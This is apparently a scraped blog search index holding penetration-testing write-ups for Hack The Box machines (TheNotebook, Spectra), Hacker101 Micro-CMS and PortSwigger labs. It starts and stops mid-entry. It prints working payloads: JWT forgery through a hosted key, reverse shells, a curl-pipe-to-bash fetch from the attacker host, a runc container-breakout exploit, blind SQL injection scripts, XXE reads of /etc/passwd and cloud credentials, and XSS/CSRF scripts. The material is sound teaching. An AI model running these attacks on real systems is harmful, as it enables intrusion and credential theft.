&quot;RS256&quot;, &quot;kid&quot;: &quot;http://localhost:7070/privKey.key&quot;}{ &quot;username&quot;: &quot;antonio&quot;, &quot;email&quot;: &quot;antonio.sacco@gmail.com&quot;, &quot;admin_cap&quot;: 0}parse error: Invalid numeric literal at line 2, column 3There’s a strange reference to the private key in the JWT header.We definitely need to look more into itBypass JWT tokenIn the JWT header we have a link to a private key. It will be used by the server to verify the correctness of the signature.We first try to access the /privKey.key but nope :(.We know that the server needs to access the file and retrieve the content before the authenticity check of the JWT takes place.That means that we could trick the server into fetching the private key from our local webserver, listening on port 7070.We use a python script to generate and send the token, using the pyjwt python module.import jwtimport requests# Generate jwt. Algorithm and secret are not important.encoded = jwt.encode({&quot;username&quot;:&quot;antonio&quot;,&quot;email&quot;:&quot;antonio.sacco@gmail.com&quot;,&quot;admin_cap&quot;:0}, &quot;&quot;, headers={&quot;kid&quot;:&quot;http://10.10.14.22:7070/privKey.key&quot;})cookies = {&quot;auth&quot;:encoded}r = requests.get(&#39;http://10.10.10.230/&#39;,cookies=cookies)print(encoded)print(&quot;JWT sent&quot;)Algorithm and secret are not important in this case.We create a simple webserver to receive the request$ python3 -m http.server 7070Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...10.10.10.230 - - [05/May/2021 11:37:27] code 404, message File not found10.10.10.230 - - [05/May/2021 11:37:27] &quot;GET /privKey.key HTTP/1.1&quot; 404 -We are not currently hosting a privKey.key yet, but this response confirm that the file is actually fetched.How can we leverage it?Well, given that we can control the private key, we can forge any JWT token we want.Login as adminWe create our new token using JWT.io, very fast and convenient.We select the RS256 algorithm. The JWT.io offers an easy to use interface to create tokens. They already provide us of a mock private and pub key pairWe change the username to admin and the admin_cap to 1 (Not really sure what it does, but it’s probably 1 for admins)) The private key will be used by the victim server to check the validity of the signature.We create a privKey.key in locale, copying the private key from JWT.io.We start again the local webserver: python3 -m http.server 7070.We copy the token and paste it in the auth cookie. Refreshing the page we are logged in as admin. In the Admin panel we can upload a file. We upload our reverse shell and we get foothold.$ nc -lnvp 4444listening on [any] 4444 ...connect to [10.10.14.22] from (UNKNOWN) [10.10.10.230] 51240Linux thenotebook 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux 11:43:52 up 6:35, 0 users, load average: 0.00, 0.00, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#39;t access tty; job control turned off$ whoami www-data$ UserWe have a shell under the www-data user.Stabilize the shell: python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;Enumeration with linpeas: curl http://10.10.14.22:7070/linpeas.sh | bashmeanwhile we also move around in the system.The content of /var is not standard at all. We should take a deeper look.In /var/backups there is an interesting file that we can read: home.tar.gz.We unzip it in the /var/tmp directory because we have write permissions therewww-data@thenotebook:/var/backups$ tar -xvzf home.tar.gz --directory /var/tmphome/ home/noah/ home/noah/.bash_logout home/noah/.cache/ home/noah/.cache/motd.legal-displayed home/noah/.gnupg/ home/noah/.gnupg/private-keys-v1.d/ home/noah/.bashrc home/noah/.profile home/noah/.ssh/ home/noah/.ssh/id_rsa home/noah/.ssh/authorized_keys home/noah/.ssh/id_rsa.pub It’s the backup of the noah’s home directory.It contains the private ssh key.We can take it and use it to login as noah in ssh (don’t forget to restrict the permissions of the id_rsa file, otherwise the ssh server will refuse the connection)$ ssh noah@10.10.10.230 -i id_rsaLast login: Wed Feb 24 09:09:34 2021 from 10.10.14.5noah@thenotebook:~$ We have now a shell as noah.RootHere we start our path to root.We can execute a docker command as root without the need of the password First thing we do is to look at GTFObins but none of the tips applies to our case.We can spawn a shell as the root user in docker Moving around the docker we find some interesting hashes in /opt/webapp/create_db.py:User(username=&#39;admin&#39;, email=&#39;admin@thenotebook.local&#39;, uuid=admin_uuid, admin_cap=True, password=&quot;0d3ae6d144edfb313a9f0d32186d4836791cbfd5603b2d50cf0d9c948e50ce68&quot;),User(username=&#39;noah&#39;, email=&#39;noah@thenotebook.local&#39;, uuid=noah_uuid, password=&quot;e759791d08f3f3dc2338ae627684e3e8a438cd8f87a400cada132415f48e01a2&quot;)We try to crack the hashes with hashcat. The algorithm used is probably SHA3-256 ( as it’s the the one used in //opt/webapp/main.py)hashcat -m 17400 -a 0 hash /usr/share/wordlists/rockyou.txtNone of the passwords are recovered.Escape the docker containerLet’s look at the docker versionnoah@thenotebook:~$ docker --versionDocker version 18.06.0-ce, build 0ffa825We can search for known exploits:$ searchsploit docker 18.06.0-------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path-------------------------------------------------------------------------------- ---------------------------------runc &amp;lt; 1.0-rc6 (Docker &amp;lt; 18.09.2) - Container Breakout (1) | linux/local/46359.mdrunc &amp;lt; 1.0-rc6 (Docker &amp;lt; 18.09.2) - Container Breakout (2) | linux/local/46369.md-------------------------------------------------------------------------------- ---------------------------------We download the second one with: searchesploit -m linux/local/46369.md.(I picked randomly between the 2, I suppose they both work)We modify the payload of the exploit in CVE-2019-5736/bad_init.sh by adding our reverse shell We set up a netcat llistener on our local machine: nc -lnvp 4242The docker cleans itself pretty quickly, we need to deliver and execute our exploit fastsudo docker exec -it webapp-dev01 curl http://10.10.14.150:8000/exploit.zip --output exploit.zip &amp;amp;&amp;amp;sudo docker exec -it webapp-dev01 unzip exploit.zip &amp;amp;&amp;amp;sudo docker exec -it webapp-dev01 ./CVE-2019-5736/make.sh &amp;amp;&amp;amp;sudo docker exec -it webapp-dev01 /bin/bash In order these commands will: Deliver the exploit archive to the docker container from our local machine Unzip it Compile the exploit Trigger our payload(Below if you want to hear more on the exploit and vulnerability)It’s now time to execute it.Output: % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 8413 100 8413 0 0 115k 0 --:--:-- --:--:-- --:--:-- 117kArchive: exploit.zipreplace CVE-2019-5736/bad_init.sh? [y]es, [n]o, [A]ll, [N]one, [r]ename: y inflating: CVE-2019-5736/bad_init.sh replace CVE-2019-5736/make.sh? [y]es, [n]o, [A]ll, [N]one, [r]ename: ^Cnoah@thenotebook:~$ ./file.sh OCI runtime state failed: fork/exec /usr/bin/docker-runc: text file busy: : unknownnoah@thenotebook:~$ ./file.sh % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 8400 100 8400 0 0 102k 0 --:--:-- --:--:-- --:--:-- 103kArchive: exploit.zip creating: CVE-2019-5736/ inflating: CVE-2019-5736/bad_init.sh inflating: CVE-2019-5736/make.sh inflating: CVE-2019-5736/README.md inflating: CVE-2019-5736/.README.md.swp inflating: CVE-2019-5736/bad_libseccomp.c +++ dirname ./CVE-2019-5736/make.sh++ readlink -f ./CVE-2019-5736+ cd /opt/webapp/CVE-2019-5736++ egrep &#39;libseccomp\\.so&#39;++ sort -r++ find /lib /lib64 /usr/lib++ head -n1+ SECCOMP_TARGET=/usr/lib/x86_64-linux-gnu/libseccomp.so.2.3.3+ cp ./bad_libseccomp.c ./bad_libseccomp_gen.c+ objdump -T /usr/lib/x86_64-linux-gnu/libseccomp.so.2.3.3+ awk &#39;($4 == &quot;.text&quot; &amp;amp;&amp;amp; $6 == &quot;Base&quot;) { print &quot;void&quot;, $7 &quot;() {}&quot; }&#39;+ cp ./bad_init.sh /bad_init+ gcc -Wall -Werror -fPIC -shared -rdynamic -o /usr/lib/x86_64-linux-gnu/libseccomp.so.2.3.3 ./bad_libseccomp_gen.c+ mv /bin/bash /bin/good_bash+ cat+ chmod +x /bin/bash[+] bad_libseccomp.so booted.[+] opened ro /proc/self/exe &amp;lt;3&amp;gt;.[+] constructed fdpath &amp;lt;/proc/self/fd/3&amp;gt;[+] bad_init is ready -- see &amp;lt;/tmp/bad_init_log&amp;gt; for logs.[*] dying to allow /proc/self/exe to be unused...Meanwhile on our local machine…$ nc -lnvp 4242listening on [any] 4242 ...connect to [10.10.14.150] from (UNKNOWN) [10.10.10.230] 50662sh: 0: can&#39;t access tty; job control turned off# whoamirootThe exploit worked and we have now a root shell on the victim machine.The flag is waiting for us under the /root/ directory# ls /root/cleanup.shdocker-runcreset.shroot.txtstart.sh# A quick look at the vulnerability: CVE-2019-5736CVE description by MITRE:“runc through 1.0-rc6, as used in Docker before 18.09.2 and other products, allows attackers to overwrite the host runc binary (and consequently obtain host root access) by leveraging the ability to execute a command as root within one of these types of containers: (1) a new container with an attacker-controlled image, or (2) an existing container, to which the attacker previously had write access, that can be attached with docker exec. This occurs because of file-descriptor mishandling, related to /proc/self/exe. “The runC is a container runtime. It contains all the code used to interact with the system features related to the container.The vulnerability had a big impact given the wide diffusion of containers using runC.Very interesting read if you want to learn more about the vulnerability and the exploit:https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/" }, { "title": "Hacker101 - Micro-CMS-v2", "url": "/posts/Micro-CMS-v2/", "categories": "Hacker101", "tags": "sql-injection, blind-sql-injection, broken-access-control, like, union", "date": "2021-07-16 20:25:00 +0200", "snippet": "The website contains 3 flags, we need to find them all.Landing page is: Seems like they fixed the vulnerabilities of the previous Micro-CMS v1 challenge.Writeup here Flag 0 - SQL injectionWe can crash the login page by entering the username &#39; We revealed the SQL query used to retrieve the password of the provided username, the DB in use (MariaDB) and the language of the web app (python 2.7)If we send username=&#39; or &#39;1&#39;=&#39;1&amp;amp;password=pass123 we bypass the check on the username but we receive ‘Incorrect password, as the password retrieved from the database doesn’t match the password we provide in the form.We can leverage the UNION query to control the password loaded from the database. This password will later be checked against the provided password variable in the form.Since we can control both of them, we can log in without knowing an existing username and password pair.The POST data we send is:username=&#39; UNION SELECT &quot;newpass&quot; #&amp;amp;password=newpassand we successfully log in We are assigned a JWT Auth token and the flag can be found in the Private Page.Flag 1 - Broken access controlEvery time we try to edit a post we are redirected to the login page because we are required to be authenticated. However, what if we try to directly edit the post with Burp, without following the expected logic flow? It shouldn’t be possible if the access to resources is well implemented. But is it?Not really.Our request is: And we get the flag in the response: Flag 2 - Blind SQL injection bruteforceOnce we are logged in, we notice a html comment that suggests us to find the real username and password if we don’t have them yet:&amp;lt;!-- You got logged in, congrats! Do you have the real username and password? If not, might want to do that! --&amp;gt;And this is what we are going to do.We can exploit the SQL vulnerability further. Here we have a blind SQL vulnerability that we can exploit to extract the username and the password one character at a time.The condition that allows us to bruteforce the username is the Invalid password string that is printed out when the database query returns something.We can use the LIKE sql statement to make the username match to a certain pattern that we provide. For example we can use it to emulate a startwith() function (e.g. WHERE username LIKE &#39;a%&#39; will match all the usernames that start with a)The script we used to bruteforce the username is the following:import requestsimport realphabet=&quot;abcdefghijklmnopqrstuvxywzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;url= &quot;http://35.190.155.168/44c8933501/login&quot;username=&quot;&quot;for x in range(0,32): print(&quot;cicle: &quot;+str(x)) for letter in alphabet: temp = username+letter data= { &quot;username&quot;: &quot;&#39; or username LIKE &#39;{}%&quot;.format(temp), &quot;password&quot;: &#39;temp&#39; } page = requests.post(url,data=data) # if previous query returns a match -&amp;gt; Invalid password in response if re.search(&quot;Invalid password&quot;,page.text): username=temp print(&quot;MATCH: &quot;+username) breakWe end up with the username lelah.We can now proceed bruteforcing the password, same approach.import requestsimport realphabet=&quot;abcdefghijklmnopqrstuvxywzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;url= &quot;http://35.190.155.168/44c8933501/login&quot;password=&quot;&quot;for x in range(0,32): print(&quot;cicle: &quot;+str(x)) for letter in alphabet: temp = password+letter data= { &quot;username&quot;: &quot;lelah&#39; and password LIKE &#39;{}%&quot;.format(temp), &quot;password&quot;: &#39;temp&#39; } page = requests.post(url,data=data) # if previous query returns a match -&amp;gt; Invalid password in response if re.search(&quot;Invalid password&quot;,page.text): password=temp print(&quot;MATCH: &quot;+password) breakChar by char we retrieve the full password: romaine.We can now log in using the recovered username and password.The flag is waiting for us right after the login. " }, { "title": "Hacker101 - Micro-CMS v1 writeup", "url": "/posts/Micro-CMS-v1/", "categories": "Hacker101", "tags": "xss, broken-access-control, ffuf", "date": "2021-07-16 10:29:00 +0200", "snippet": "There are 4 flags (= at least 4 vulnerabilities) in this website. We need to hunt them all.The landing page is : We can create our own page using Markdown.Flag 1 - Stored XSS on TitleAn XSS in the Title input: Flag 2 - Stored XSS on BodyThe &amp;lt;script&amp;gt;alert(1);&amp;lt;script&amp;gt; is filtered in the page body.However we can use the &amp;lt;img&amp;gt; tag and trigger the XSS: Flag 3 - Broken access controlWe notice that the posts we create are indexed sequentially starting from 10. The indexes between 3 and 9 (included) are not used. This is indeed a strange behavior.So, we try to access those indices using ffuf As we can see, we get a weird 403 for the index 7,namely http://35.190.155.168/eed29828c5/page/7Since we are forbidden the access to such resource, we can try to check whether we can access it in other ways.The website offers the possibility to edit previously created pages. So we can try to edit the page at index 7 by visiting the page /eed29828c5/page/edit/7.The access to the resource is not forbidden this time and we there we find our flag Flag 4 - Tweaking url inputsWe try to think about the url inputs that may not be hardcoded in the web app.Since the page ID may be one of those, we try to replace the expected integer with a special character.We surprisingly get the flag when we provide a single quote &#39;. Probably the application is crashing due to SQL injection and prints the flag to the page as error." }, { "title": "PortSwigger Labs - Business logic - Missing validation of negative quantities", "url": "/posts/Business-logic-negative-quantities/", "categories": "PortSwigger-Labs", "tags": "business-logic", "date": "2021-07-14 21:12:00 +0200", "snippet": "DescriptionLink: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level WriteupWe move through the website while recording the HTTP traffic using Burp.When an item is added to the cart, the request looks like this one: The item’s productID and quantity are specified in the POST body and sent to the server (The productId=1 represents our Lightweight l33t leather jacket).We change the quantity to -100. Since quantity is not properly validated, our cart will have a negative value. trying to place the order for that cart, we get an error: The server checks for the cart’s total and throws an error if the quantity is negative.However, since we can add negative quantities for items, we can use them to make the cart’s value lower (while keeping it positive). In this way we are able to afford our dream jacket. Placing the order, we manage to buy a 1337 dollar jacket for 33.11 dollars (we could lower the price up to 0.01 if we really want to save money :) ) " }, { "title": "PortSwigger Labs - Business Logic - Excessive trust in client side controls", "url": "/posts/Business-logic-trust-client-side-controls/", "categories": "PortSwigger-Labs", "tags": "business-logic", "date": "2021-07-14 19:09:00 +0200", "snippet": "DescriptionLink: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls WriteupGoal of the challenge is to buy a Lightweight l33t leather jacket.We first login to our account. We only have 100 dollars and the jacket we want to buy is way too expensive for us (1337 dollars): We add the Lightweight l33t leather jacket to our cart and try to place the order.As expected we are not allowed to, because we don’t have enough credit We can fire up Burp while we perform different kind of operations in order to log the requests and responses.Taking a look at the generated HTTP traffic, we notice a specific HTTP request, containing the product id and the price of the item. This request is generated when an item is added to the cart.We can try to lower the price of the item (productId=1 is for our Lightweight l33t leather jacket): And we see that the price is actually changed: Placing the order, we can now buy each Lightweight l33t leather jacket for 0.10 dollars. Not bad !" }, { "title": "PortSwigger Labs - XXE to SSRF to exfiltrate EC2 instance metadata", "url": "/posts/XXE-to-SSRF/", "categories": "PortSwigger-Labs", "tags": "ssrf, xxe, ec2, iam", "date": "2021-07-13 20:02:00 +0200", "snippet": "DescriptionLink: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf WriteupWe can modify the XML sent to the server in the check stock feature and see what happens If the productId does not contain a valid value, then an error message will be displayed.We know that it is vulnerable to XXE. We can access the EC2 metadata endpoint and look for the IAM secret. With some googling and trial and error we find the correct path to the IAM secret credentials, namely http://169.254.169.254/latest/meta-data/iam/security-credentials/adminSo our XML will look like&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&quot;&amp;gt; ]&amp;gt;&amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt; &amp;amp;xxe; &amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt; 1 &amp;lt;/storeId&amp;gt;&amp;lt;/stockCheck&amp;gt;And we get the secrets We successfully exploited an XXE vulnerability to perform a SSRF attack and retrieve the IAM secret credentials from the EC2 metadata instance." }, { "title": "PortSwigger Labs - Simple XXE to retrieve sensible files", "url": "/posts/XXE-to-retrieve-files/", "categories": "PortSwigger-Labs", "tags": "xxe", "date": "2021-07-13 19:15:00 +0200", "snippet": "DescriptionLink: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files WriteupThe website offers a check stock feature that displays the number of items of a specific product in one of the shops.Each product has an id, as well as each shop.We can intercept the request using Burp The XML is passed to the server, processed and the response is displayed in the web page.Since no protections are in place, we can load sensitive files using the external entities. We change the XML as follows: It will load the content of the /etc/passwd file in the xxe entity. The server will respond with an error message (since the product ID is not valid) and will print the content of /etc/passwd file: We successfully managed to perform an XXE attack to exfiltrate sensitive information." }, { "title": "PortSwigger Labs - CSRF with no defenses", "url": "/posts/CSRF-with-no-defenses/", "categories": "PortSwigger-Labs", "tags": "csrf", "date": "2021-07-13 16:18:00 +0200", "snippet": "DescriptionLink: https://portswigger.net/web-security/csrf/lab-no-defenses WriteupWe can login to our account with the credentials we have wiener:peter.Once logged it we are redirected to our account page Here we can change our email by providing a new email.We fire up Burp in order to record the update email request and analyze it The new email is specified in the POST body and url encoded.Since there aren’t any CSRF protections we can simply make the victim issue a change email operation and hardcode the new email in the post body.The response that we will serve back to the victims when they visit the /exploit page is the following: The form will be submitted without any user interaction and they email will be changed to pwned@gmail.com.The CSRF attack succedeed." }, { "title": "PortSwigger Labs - Stored XSS to CSRF to change users email", "url": "/posts/Stored-XSS-to-CSRF-to-change-users-email/", "categories": "PortSwigger-Labs", "tags": "xss, stored-xss, csrf, csrf-token-bypass", "date": "2021-07-04 11:36:00 +0200", "snippet": "DescriptionLink : https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrfWriteupWe log in as the wiener user and we are redirected to our account page (/my-account):The page exposes a update email functionality and it is protected by a CSRF token.We can use Burp to intercept the HTTP requests in order to understand the update email mechanism in detail.We change the email to luca@normal-user.net and here is the request:The email and the CSRF token are sent in the POST data after being urlencoded. Given that the request is protected by a CSRF token it is necessary to provide a valid token in order for the request to be valid.This is where the XSS comes handy: if we manage to execute javascript in the user’s context, we will be able to dynamically scrape the valid CSRF token from the page and submit it together with the email.Let’s look for the XSS then.The XSS can be easily spotted by testing the trivial &amp;lt;script&amp;gt; tag on the comment text areaAnd Javascript is executed.We can now use the XSS to bypass the CSRF protection and perform a CSRF attack in order to change the password of the users who will visit the page where the XSS is stored.Since the mail is changed with a POST request, we need to trick the user to perform a POST request to the /my-account/change-email endpoint, submitting the new email and the valid CSRF token.We wrote some lines of Javascript for the purpose (i.e. our XSS payload).email and csrf token should be urlencoded in order to conform to the POST data format we previously observed in Burp:&amp;lt;script&amp;gt;var xhr = new XMLHttpRequest();xhr.open(&#39;POST&#39;, &#39;/my-account/change-email&#39;, true);xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;);xhr.send(new URLSearchParams({ &#39;email&#39;: &#39;pwned@gmail.com&#39;, &#39;csrf&#39;: document.getElementsByName(&#39;csrf&#39;)[0].value }) );&amp;lt;/script&amp;gt;However it is not successful.Taking some steps back to spot the issue, we notice that the CSRF token is only issued after the user visits the account page, namely /my-account. Such behavior caused the document.getElementsByName(&#39;csrf&#39;)[0].value to be null, as the token was not there yet.We can easily fix the issue by first issuing a request to /my-account and scraping the CSRF token from the response. Therefore, our new XSS payload looks like:&amp;lt;script&amp;gt;var xhr = new XMLHttpRequest();xhr.onload = function() { var token = this.response.getElementsByName(&#39;csrf&#39;)[0].value; xhr.open(&#39;POST&#39;, &#39;/my-account/change-email&#39;, true); xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;); xhr.send(new URLSearchParams({ &#39;email&#39;: &#39;pwned@gmail.com&#39;, &#39;csrf&#39;: token }) );};xhr.open(&#39;GET&#39;, &#39;/my-account&#39;, true);xhr.responseType = &quot;document&quot;;xhr.send();&amp;lt;/script&amp;gt;Some notes on the code: When this is used in the context of a DOM event handler, it is set to the element on which the listener is placed (xhr in this case). The onload event triggers when the response is fully loaded We prepare the onloadevent handler before the request to my-account takes place to make sure that the handler will be ready.We completed the lab successfully. Now every users who will visit the page where our XSS is stored will have the email changed to pwned@gmail.com." }, { "title": "PortSwigger Labs - Stored DOM XSS", "url": "/posts/Stored-DOM-XSS/", "categories": "PortSwigger-Labs", "tags": "xss, stored-xss, javascript", "date": "2021-06-28 01:34:00 +0200", "snippet": "DescriptionLink: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-storedWriteupA comment feature is implemented within each post in the pageWe can test each field for XSS, starting with the simple &amp;lt;scriptalert(1)&amp;lt;/script.Some filtering is in place.We can study the source code of the page to see whether the escaping is performed client side.Something interesting pops up:Zooming into the javascript file we can analyze the code: Some HTML characters are escapedAnd this is what the function escapeHTML doesIt sanitizes the characters &amp;lt; and `` by using the replace() function. However such function will only replace the first instance of the value.We can easily bypass the escaping by prepending &amp;lt; to our payload.However &amp;lt; &amp;lt;scriptalert(1)&amp;lt;/script doesn’t seem to work.At this point we can try a bunch of different payloads and see whether the XSS is triggered or not.Payload &amp;lt;&amp;lt;img src=q onerror=alert(1) is successful." }, { "title": "PortSwigger Labs - Reflected XSS with some SVG markup allowed", "url": "/posts/Reflected-XSS-with-SVG/", "categories": "PortSwigger-Labs", "tags": "xss, reflected-xss, svg", "date": "2021-06-27 11:57:00 +0200", "snippet": "DescriptionLink: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed WriteupWe know the svg tag is going to be successful.We try &amp;lt;svg onload=alert(1) but the onload event is blacklisted.What we can do is fuzzing the event attribute to figure out which event is allowed.We can do it using Burp intruder.The request we crafted is Our dictonary is a wordlist file with all the events.Running Intruder we get to know that the onbegin event is whitelisted: We can exploit it and craft our XSS payload. We try a couple of different payloads, then we find the right one using the animatetransform tag:&amp;lt;svg&amp;gt;&amp;lt;animatetransform onbegin=alert(document.domain) attributeName=transform&amp;gt; " }, { "title": "Hack The Box - Spectra Writeup", "url": "/posts/Spectra/", "categories": "Hack The Box, Machines", "tags": "misconfiguration, wordpress, mysql", "date": "2021-06-26 03:12:00 +0200", "snippet": "FootholdStart with usual nmap enumeration&amp;gt;&amp;gt; nmap -sC -sV -oN nmap-initial 10.10.10.229Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-25 20:23 CESTNmap scan report for 10.10.10.229Host is up (0.030s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.1 (protocol 2.0)| ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)80/tcp open http nginx 1.17.4|_http-server-header: nginx/1.17.4|_http-title: Site doesn&#39;t have a title (text/html).3306/tcp open mysql MySQL (unauthorized)|_ssl-cert: ERROR: Script execution failed (use -d to debug)|_ssl-date: ERROR: Script execution failed (use -d to debug)|_sslv2: ERROR: Script execution failed (use -d to debug)|_tls-alpn: ERROR: Script execution failed (use -d to debug)|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 57.51 secondsWe visit the main page on port 80 Both links redirect us to a spectra.htb domain.We insert the domain in the /etc/hosts file so that we can access the resources.Following the first link we reach a wordpress page.We fire up dirbuster on the and wpscan.Dirbuster on the main page with rockyou dictionary. Allow php extension as the web server is powered by php.As we see in the server’s response headers:Server: nginx/1.17.4X-Powered-By: PHP/5.6.40http://spectra.htb/testing/ is exposed and we can see all the files and directories (no need of dirbuster).Usually passwords and configurations are in the wp-config.php file.We visit the file http://spectra.htb/testing/wp-config.php.save. It is probably an exposed autosave file created by nginx.&amp;lt;?php/** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the * installation. You don&#39;t have to use the web site, you can * copy this file to &quot;wp-config.php&quot; and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://wordpress.org/support/article/editing-wp-config-php/ * * @package WordPress */// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define( &#39;DB_NAME&#39;, &#39;dev&#39; );/** MySQL database username */define( &#39;DB_USER&#39;, &#39;devtest&#39; );/** MySQL database password */define( &#39;DB_PASSWORD&#39;, &#39;devteam01&#39; );/** MySQL hostname */define( &#39;DB_HOST&#39;, &#39;localhost&#39; );/** Database Charset to use in creating database tables. */define( &#39;DB_CHARSET&#39;, &#39;utf8&#39; );/** The Database Collate type. Don&#39;t change this if in doubt. */define( &#39;DB_COLLATE&#39;, &#39;&#39; );/**#@+ * Authentication Unique Keys and Salts. * * Change these to different unique phrases! * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service} * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again. * * @since 2.6.0 */define( &#39;AUTH_KEY&#39;, &#39;put your unique phrase here&#39; );define( &#39;SECURE_AUTH_KEY&#39;, &#39;put your unique phrase here&#39; );define( &#39;LOGGED_IN_KEY&#39;, &#39;put your unique phrase here&#39; );define( &#39;NONCE_KEY&#39;, &#39;put your unique phrase here&#39; );define( &#39;AUTH_SALT&#39;, &#39;put your unique phrase here&#39; );define( &#39;SECURE_AUTH_SALT&#39;, &#39;put your unique phrase here&#39; );define( &#39;LOGGED_IN_SALT&#39;, &#39;put your unique phrase here&#39; );define( &#39;NONCE_SALT&#39;, &#39;put your unique phrase here&#39; );/**#@-*//** * WordPress Database Table prefix. * * You can have multiple installations in one database if you give each * a unique prefix. Only numbers, letters, and underscores please! */$table_prefix = &#39;wp_&#39;;/** * For developers: WordPress debugging mode. * * Change this to true to enable the display of notices during development. * It is strongly recommended that plugin and theme developers use WP_DEBUG * in their development environments. * * For information on other constants that can be used for debugging, * visit the documentation. * * @link https://wordpress.org/support/article/debugging-in-wordpress/ */define( &#39;WP_DEBUG&#39;, false );/* That&#39;s all, stop editing! Happy publishing. *//** Absolute path to the WordPress directory. */if ( ! defined( &#39;ABSPATH&#39; ) ) { define( &#39;ABSPATH&#39;, __DIR__ . &#39;/&#39; );}/** Sets up WordPress vars and included files. */require_once ABSPATH . &#39;wp-settings.php&#39;;In particular, it is possible to observe the password and username of the mysql database.define( &#39;DB_NAME&#39;, &#39;dev&#39; );/** MySQL database username */define( &#39;DB_USER&#39;, &#39;devtest&#39; );/** MySQL database password */define( &#39;DB_PASSWORD&#39;, &#39;devteam01&#39; );/** MySQL hostname */define( &#39;DB_HOST&#39;, &#39;localhost&#39; );We can now try the new credentials we found: Access the sql database using this credentials. Not possible as the access is restricted to localhost (define( &#39;DB_HOST&#39;, &#39;localhost&#39; );. We try ssh. Credentials not correct. We try to login in wordpress (http://spectra.htb/ /main/wp-admin). Credentials not correct.Moving around in the wordpress site, another username pops up: administrator.We thus try the pair ‘administrator’ and ‘devteam01’ to login in Wordpress. It works and we are in!nginx userWe managed to break into the Wordpress portal as the administrator user.We now have to find a way to access the underline OS.It can be easily done by inserting a reverse shell in the 404.php page of the active wordpress theme. The malicious code will be triggered when the page get visited.In order to do this, we go to Plugins &amp;gt; Theme editor, then replace the code in 404.php with our reverse shell.I was to able to modify the 404.php page of the active theme (Twenty Twenty), so I injected my rev shell in the 404 page of the Twenty Seventeen theme, and activate it.Once the file is updated successfully, we can trigger our reverse shell by directly visiting the http://spectra.htb/main/wp-content/themes/twentyseventeen/404.php or by visiting a non existing page (e.g. http://spectra.htb/main/ssas) which would serve the 404 page.koen@koen:~/Uni/HTB/Machines/Spectra$ nc -lnvp 1234listening on [any] 1234 ...connect to [10.10.14.200] from (UNKNOWN) [10.10.10.229] 44698Linux spectra 5.4.66+ #1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7401P 24-Core Processor AuthenticAMD GNU/Linux 13:47:58 up 19 min, 0 users, load average: 0.05, 0.19, 0.20USER TTY LOGIN@ IDLE JCPU PCPU WHATuid=20155(nginx) gid=20156(nginx) groups=20156(nginx)$ whoaminginxKatie userIn /opt we have a suspicious file autologin.conf.origfor dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do if [ -e &quot;${dir}/passwd&quot; ]; then passwd=&quot;$(cat &quot;${dir}/passwd&quot;)&quot; breakThe above script checks whether a passwd file is stored in the /mnt/stateful_partition/etc/autologin or /etc/autologin.By printing the content of /etc/autologin/passwd we found the password of the katie user: SummerHereWeCome!!We log in through ssh with the pair katie:SummerHereWeCome!!RootA fast check to see which commands can be executed by katie as another user.katie@spectra ~ $ sudo -lUser katie may run the following commands on spectra: (ALL) SETENV: NOPASSWD: /sbin/initctlSince katie can run initctl as the root user, we can create an upstart script with our malicious code and run it using initctcl.In order to make our created conf file visible to initctl we need to place it under the /etc/init or /etc/init.d directory. This is not really possible because katie does not have the permissions to do that.We cannot insert files in those directories, but we may be able to exploit some of the files which are already located there.So we take a look at the files in /etc/init, hoping to find some interesting entries that can help us escalating the privileges.rw-r--r-- 1 root root 1430 Jan 15 15:35 syslog.conf-rw-r--r-- 1 root root 651 Jan 15 15:35 sysrq-init.conf-rw-r--r-- 1 root root 2665 Jan 15 15:34 system-proxy.conf-rw-r--r-- 1 root root 1694 Jan 15 15:35 system-services.conf-rw-r--r-- 1 root root 671 Dec 22 06:10 tcsd.conf-rw-rw---- 1 root developers 478 Jun 29 2020 test.conf-rw-rw---- 1 root developers 478 Jun 29 2020 test1.conf-rw-rw---- 1 root developers 478 Jun 29 